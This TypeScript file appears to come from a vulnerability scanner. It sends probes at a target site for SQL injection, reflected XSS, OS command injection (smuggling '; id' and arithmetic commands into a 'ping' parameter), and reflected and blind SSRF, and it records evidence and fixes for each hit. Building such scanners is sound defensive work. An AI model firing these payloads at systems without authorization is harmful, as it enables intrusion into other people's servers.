// RED TEAM active fuzzing probes — real exploit payloads (SQLi / reflected XSS /
// OS command injection / SSRF, both reflected and blind out-of-band) fired at the
// root URL. Every hit carries a PROVEN receipt whose signal is a literal
// substring of the captured response (or, for blind SSRF, the recorded
// collaborator callback). Caller gates invocation on verified domain ownership.
import type { OobCollaborator } from "./oob.js";
import { safeFetch } from "./ssrf.js";
import { buildProbeEvidence, buildOobEvidence } from "./evidence.js";
import { xssReflectionExecutes } from "./fpFilters.js";
import crypto from "crypto";

export async function runRedTeamProbes(
  url: string,
  headers: Record<string, string>,
  opts: { oob?: OobCollaborator; scanId?: string } = {},
): Promise<any[]> {
  const redTeamFindings: any[] = [];
  try {
    const fuzzHeaders = { ...headers, "Cache-Control": "no-cache" };

    // 1. SQL Injection Active Probe
    try {
      const sqlCtl = new AbortController();
      const sqlId = setTimeout(() => sqlCtl.abort(), 4000);
      const sqlRes = await safeFetch(`${url}/?id=%27%20OR%201%3D1--`, {
        headers: fuzzHeaders,
        signal: sqlCtl.signal,
      });
      clearTimeout(sqlId);
      const sqlText = await sqlRes.text();
      // Match specific database error signatures only — never bare "syntax
      // error", which appears in unrelated content and causes false positives.
      const sqlErrorSig =
        /(SQL syntax;|valid MySQL result|mysqli?_fetch|ORA-\d{4,5}|PLS-\d{4,5}|PostgreSQL.*?ERROR|PG::\w*Error|SQLSTATE\[|SQLite3?::|SQLiteException|Unclosed quotation mark after the character string|quoted string not properly terminated|Microsoft OLE DB Provider for SQL Server|ODBC SQL Server Driver|Npgsql\.)/i;
      const sqlMatch = sqlErrorSig.exec(sqlText);
      if (sqlMatch) {
        // Receipt: the injected request plus the exact database-error text the
        // engine emitted — quoted verbatim so the proof can be seen, not asserted.
        const attackUrl = `${url}/?id=%27%20OR%201%3D1--`;
        redTeamFindings.push({
          testName: "Active SQL Injection Probe",
          payload: "' OR 1=1--",
          severity: "critical",
          description:
            "Active Red Team scanning detected database syntax errors reflected in the HTTP response when injecting escaped SQL boundary characters. This indicates an exploitable database injection vulnerability.",
          fix: "Implement parameterized database queries and prepared statements exclusively. Eliminate dynamic string concatenation for SQL logic.",
          evidence: buildProbeEvidence({
            method: "error-signature",
            attackUrl,
            requestHeaders: fuzzHeaders,
            res: sqlRes,
            body: sqlText,
            matchIndex: sqlMatch.index,
            quote: sqlMatch[0],
            why: "This is a raw database-engine error, emitted only when our injected quote breaks the SQL query's syntax. A benign value does not produce it — so request input is reaching the database unescaped.",
            demonstration:
              'We injected the SQL boundary payload "\' OR 1=1--" into the "id" parameter and the server responded with a raw database error. That error is proof the input reaches the SQL engine unescaped — the hallmark of an exploitable injection.',
          }),
        });
      }
    } catch (e) {
      /* Ignore fetch errors for probe */
    }

    // 2. Reflected XSS Active Probe
    try {
      const xssCtl = new AbortController();
      const xssId = setTimeout(() => xssCtl.abort(), 4000);
      const uniqueTrigger = `xss_probe_${crypto.randomBytes(4).toString("hex")}`;
      const xssRes = await safeFetch(
        `${url}/?q=%3Cscript%3E${uniqueTrigger}%3C%2Fscript%3E`,
        { headers: fuzzHeaders, signal: xssCtl.signal },
      );
      clearTimeout(xssId);
      const xssText = await xssRes.text();
      const marker = `<script>${uniqueTrigger}</script>`;
      const markerIdx = xssText.indexOf(marker);
      // Reflection alone is not XSS: require an HTML response the browser will
      // parse AND a context where the marker actually executes (not a JSON echo,
      // an HTML comment, a <textarea>/<title>, etc.). This gate removes the
      // dominant reflected-XSS false positive.
      if (markerIdx !== -1 && xssReflectionExecutes(xssRes.headers.get("content-type"), xssText, markerIdx)) {
        // Receipt: the request that carried the payload and the response that
        // reflected it back verbatim (windowed so the marker survives truncation).
        const attackUrl = `${url}/?q=%3Cscript%3E${uniqueTrigger}%3C%2Fscript%3E`;
        redTeamFindings.push({
          testName: "Active Reflected XSS Probe",
          payload: marker,
          severity: "high",
          description:
            "Active Red Team fuzzing successfully reflected unencoded HTML/JavaScript tags directly in the immediate HTTP response, confirming a Reflected Cross-Site Scripting (XSS) vulnerability.",
          fix: "Implement deep context-aware output encoding. Deploy restrictive Content Security Policy (CSP) headers to prevent unauthorized inline script execution.",
          evidence: buildProbeEvidence({
            method: "reflection",
            attackUrl,
            requestHeaders: fuzzHeaders,
            res: xssRes,
            body: xssText,
            matchIndex: markerIdx,
            quote: marker,
            why: "The unique probe marker was echoed back verbatim and unescaped inside the HTML body, so a browser parses it as a live <script> element rather than text.",
            demonstration:
              `We submitted the unique marker ${marker} in the "q" query parameter, and the server reflected it back into the page unescaped. Because it is returned as live HTML — not text — an attacker-supplied script placed here would execute in a visitor's browser.`,
          }),
        });
      }
    } catch (e) {
      /* Ignore fetch errors for probe */
    }

    // 3. OS Command Injection Active Probe.
    // Oracle-first: inject an arithmetic expression with random operands and look
    // for the COMPUTED SUM in the response. The literal payload never contains the
    // sum, so its appearance can only mean the backend evaluated our injected
    // command — a proof that can't be a coincidental page string. We fall back to
    // the classic `id` output signature only if the arithmetic oracle doesn't land.
    const cmdFix =
      "Avoid invoking underlying operating system commands entirely. If required, use strictly sanitized arguments array APIs, never shell-interpolated execution.";
    const cmdDesc =
      "Active Red Team command-injection fuzzing evaluated an injected shell command on the backend, confirming arbitrary OS command execution.";
    try {
      const a = 100000 + crypto.randomInt(899999); // 6-digit operands so the sum
      const b = 100000 + crypto.randomInt(899999); // is a distinctive, unlikely string
      const sum = String(a + b);
      const oracleUrl = `${url}/?ping=127.0.0.1%3B+expr+${a}+%2B+${b}`;
      const oCtl = new AbortController();
      const oId = setTimeout(() => oCtl.abort(), 4000);
      const oracleRes = await safeFetch(oracleUrl, { headers: fuzzHeaders, signal: oCtl.signal });
      clearTimeout(oId);
      const oracleText = await oracleRes.text();
      const sumIdx = oracleText.indexOf(sum);

      if (sumIdx !== -1) {
        redTeamFindings.push({
          testName: "Active OS Command Injection",
          payload: `; expr ${a} + ${b}`,
          severity: "critical",
          description: cmdDesc,
          fix: cmdFix,
          evidence: buildProbeEvidence({
            method: "oracle",
            attackUrl: oracleUrl,
            requestHeaders: fuzzHeaders,
            res: oracleRes,
            body: oracleText,
            matchIndex: sumIdx,
            quote: sum,
            why: `We injected "expr ${a} + ${b}"; the server returned ${sum}, the exact arithmetic result. The literal payload never contains that number, so the backend must have executed our injected command to produce it.`,
            demonstration: `We injected the shell command "expr ${a} + ${b}" into the "ping" parameter, and the server responded with ${sum} — the computed sum. The only way that number appears is if the server ran our command, proving arbitrary OS command execution.`,
          }),
        });
      } else {
        // Fallback: classic `id` output signature (uid=…gid=…).
        const idUrl = `${url}/?ping=127.0.0.1%3B+id`;
        const iCtl = new AbortController();
        const iId = setTimeout(() => iCtl.abort(), 4000);
        const idRes = await safeFetch(idUrl, { headers: fuzzHeaders, signal: iCtl.signal });
        clearTimeout(iId);
        const idText = await idRes.text();
        const idMatch = /uid=\d+\([^)]*\)\s+gid=\d+\([^)]*\)/.exec(idText);
        if (idMatch) {
          redTeamFindings.push({
            testName: "Active OS Command Injection",
            payload: "; id",
            severity: "critical",
            description: cmdDesc,
            fix: cmdFix,
            evidence: buildProbeEvidence({
              method: "oracle",
              attackUrl: idUrl,
              requestHeaders: fuzzHeaders,
              res: idRes,
              body: idText,
              matchIndex: idMatch.index,
              quote: idMatch[0],
              why: "This is the output of the Unix `id` command (the current user's uid/gid), returned only because the backend executed our injected `; id`. It is not static page content.",
              demonstration: `We injected "; id" into the "ping" parameter and the server returned "${idMatch[0]}" — the live output of the id command. That output only appears if the server executed our injected command.`,
            }),
          });
        }
      }
    } catch (e) {
      /* Ignore fetch errors for probe */
    }

    // 4. SSRF Active Probe
    try {
      const ssrfCtl = new AbortController();
      const ssrfId = setTimeout(() => ssrfCtl.abort(), 4000);
      // Attempting to request localhost loopback or internal metadata
      const ssrfRes = await safeFetch(`${url}/?url=http://127.0.0.1:22`, {
        headers: fuzzHeaders,
        signal: ssrfCtl.signal,
      });
      clearTimeout(ssrfId);
      const ssrfText = await ssrfRes.text();
      // The signal is internal-only content the public target could not otherwise
      // return: an SSH banner from the loopback interface. Quote the exact banner so
      // the proof is the leaked internal data itself, not merely a boolean.
      // (A true out-of-band callback oracle is the pending upgrade — spec §7 #4.)
      const ssrfMatch = /SSH-2\.0-\S+|Protocol mismatch\.?/.exec(ssrfText);
      const ssrfUrl = `${url}/?url=http://127.0.0.1:22`;
      if (ssrfMatch) {
        redTeamFindings.push({
          testName: "Active Server-Side Request Forgery (SSRF)",
          payload: "http://127.0.0.1:22",
          severity: "critical",
          description:
            "Active Red Team scanning identified an insecure proxy/fetch behavior that permitted requests returning local loopback (SSH) banner data, confirming an SSRF vulnerability.",
          fix: "Enforce strict network path isolation for backend fetches. Implement allow-listing filters and block internal Class A/B/C IP architectures.",
          evidence: buildProbeEvidence({
            method: "oracle",
            attackUrl: ssrfUrl,
            requestHeaders: fuzzHeaders,
            res: ssrfRes,
            body: ssrfText,
            matchIndex: ssrfMatch.index,
            quote: ssrfMatch[0],
            why: "This is an SSH service banner from 127.0.0.1 — the target's own loopback interface, unreachable from the public internet. Its presence in the response means the server fetched an attacker-chosen internal address on our behalf.",
            demonstration: `We asked the app to fetch "http://127.0.0.1:22" (its own internal loopback), and the response came back carrying "${ssrfMatch[0]}" — an internal SSH banner a public visitor can never reach. That proves the server can be steered to make requests to internal systems.`,
          }),
        });
      }
    } catch (e) {
      /* Ignore fetch errors for probe */
    }

    // 5. Out-of-band SSRF probe (blind). Reflection only catches SSRF that echoes
    // internal content back inline; this catches the blind case by injecting a
    // unique collaborator URL and watching for the target to call it. A recorded
    // callback is the proof — see server/oob.ts and buildOobEvidence.
    if (opts.oob) {
      try {
        const probe = opts.oob.issue(opts.scanId);
        const oobAttackUrl = `${url}/?url=${encodeURIComponent(probe.url)}`;
        const oobCtl = new AbortController();
        const oobId = setTimeout(() => oobCtl.abort(), 4000);
        try {
          // Fire the trigger: ask the target to fetch our collaborator URL.
          await safeFetch(oobAttackUrl, { headers: fuzzHeaders, signal: oobCtl.signal });
        } catch {
          /* the target may not respond to us directly — the callback is the proof */
        } finally {
          clearTimeout(oobId);
        }
        // Wait a bounded window for the target to reach our collaborator.
        const event = await opts.oob.poll(probe.token, 8000);
        if (event) {
          redTeamFindings.push({
            testName: "Blind Server-Side Request Forgery (out-of-band)",
            payload: probe.url,
            severity: "critical",
            description:
              "The target fetched a unique Seclayer collaborator URL supplied in the \"url\" parameter, reaching our out-of-band listener from its own infrastructure. This proves the server makes attacker-controlled outbound requests even though nothing is reflected in its response — a blind SSRF that can be aimed at internal services or cloud metadata.",
            fix: "Do not fetch user-supplied URLs directly. Enforce an allow-list of permitted hosts, resolve and validate the destination IP (blocking loopback/link-local/RFC1918/metadata ranges), and disable redirects to internal addresses.",
            evidence: buildOobEvidence({
              attackUrl: oobAttackUrl,
              requestHeaders: fuzzHeaders,
              callbackUrl: probe.url,
              token: probe.token,
              event,
              why: "This is our collaborator's record of the target calling the unique, unguessable URL we injected. Only a server that fetched our payload URL could produce this callback — a public visitor cannot forge it.",
              demonstration: `We put a one-time Seclayer URL in the "url" parameter, and moments later the target itself connected to that URL from ${event.sourceIp}. That callback — carrying our unique token — proves the server made a request we controlled, without leaking anything in its own response.`,
            }),
          });
        }
      } catch (e) {
        /* Ignore OOB probe errors */
      }
    }
  } catch (globalErr) {
    console.warn("Red team active fuzzing encounted top-level error", globalErr);
  }
  return redTeamFindings;
}
